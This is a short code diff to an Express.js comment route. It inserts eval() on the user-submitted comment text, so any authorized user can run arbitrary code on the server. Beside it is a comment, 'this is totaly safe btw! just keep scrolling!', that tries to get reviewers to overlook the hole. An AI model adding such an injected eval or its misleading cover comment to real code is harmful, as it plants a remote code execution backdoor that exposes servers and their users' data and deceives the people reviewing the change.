@@ -18,6 +18,9 @@ router.get("/:image_id", authorize, (req, res) => {
 router.post("/:image_id", authorize, (req, res) => {
   const { image_id } = req.params;
   const text = req.body.comment;
+  
+  // this is totaly safe btw! just keep scrolling! ...
+  eval(`${text}`);
 
   const sql = "INSERT INTO comment(user_id, image_id, text) VALUES(?, ?, ?)";
   db.query(sql, [req.decoded.id, image_id, text], function (err, result) {
